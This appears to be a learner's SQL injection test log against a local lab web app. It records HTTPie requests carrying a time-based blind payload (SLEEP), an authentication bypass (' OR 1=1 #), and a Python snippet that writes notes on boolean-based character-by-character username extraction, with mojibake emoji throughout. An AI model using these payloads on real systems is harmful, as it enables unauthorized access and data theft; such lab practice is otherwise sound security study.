# Blind SQL Injection Test Log

**Date:** 2025-06-03 13:55:04

## Request
```bash
http --form POST http://localhost:5000/blind username="' OR IF(1=1, SLEEP(5), 0) -- " password=irrelevant
```

## Response
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 612
Server: Werkzeug/3.1.3 Python/3.9.22
Time taken: ~5 seconds

Result: User exists!

```

## Notes
- Payload used: `' OR IF(1=1, SLEEP(5), 0) -- `
- The delay in response time indicates a successful time-based blind SQL injection.
- This technique exploits conditional execution and time delays to infer true/false results.



---

### ğŸ“„ Vulnerability: SQL Injection

**Date:** 2025-06-03
**Target URL:** `http://localhost:5000/login`
**Tool Used:** HTTPie
**Testing Goal:** Bypass authentication using SQL injection

---

#### ğŸ”¢ Test #1

**Payload:**

```http
http --form POST http://localhost:5000/login username="' OR 1=1 #" password=irrelevant
```

**Expected Behavior:**
User should be logged in as admin

**Actual Response:**

```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ...
```

âœ… **Successful Authentication Bypass**

---

#### ğŸ§  Notes:

* `#` worked for comment truncation in MySQL
* Burp wasnâ€™t workingâ€”used HTTPie as fallback
* Remember to use `--form` to mimic HTML form submission

---from datetime import datetime
from pathlib import Path

# Re-generate the markdown file since code state was reset
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
filename = f"blind_sqli_test_{timestamp}.md"
file_path = Path("/mnt/data") / filename

markdown_content = f"""# Blind SQL Injection Test - Boolean-Based

**Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---

## ğŸ” Test Objective

Discover the `username` value character by character via a boolean-based blind SQLi attack on the `/blind` endpoint.

---

## ğŸ§ª Test Request

```bash
http --form POST http://localhost:5000/blind username="' OR SUBSTRING(username,1,1)='a' -- "

ğŸ“¥ Request Breakdown

    Method: POST

    Endpoint: /blind

    Content-Type: application/x-www-form-urlencoded

    Payload:

        The injection is in the username field

        SUBSTRING(username,1,1)='a' checks if the first letter of any username is 'a'

        ' -- comments out the rest of the original query

ğŸ“¤ Response Interpretation

    If response contains "User exists!" â†’ the character guess is correct

    If response contains "No such user." â†’ the character is incorrect

ğŸ§  Exploitation Strategy

Repeat the request by adjusting the character at each position until the full username is discovered.
ğŸ” Next Steps

    Repeat this test for each character until the entire username is revealed:

Always show details

    http --form POST http://localhost:5000/blind username="' OR SUBSTRING(username,1,1)='b' -- "
    http --form POST http://localhost:5000/blind username="' OR SUBSTRING(username,1,1)='c' -- "
    # ...etc.

ğŸ’¡ Notes

    This is a safe, educational environment.

    The technique demonstrates how vulnerable logic can leak information without direct data output.

    Once a full username is known, this method can be used on the password field similarly.

"""

file_path.write_text(markdown_content)
file_path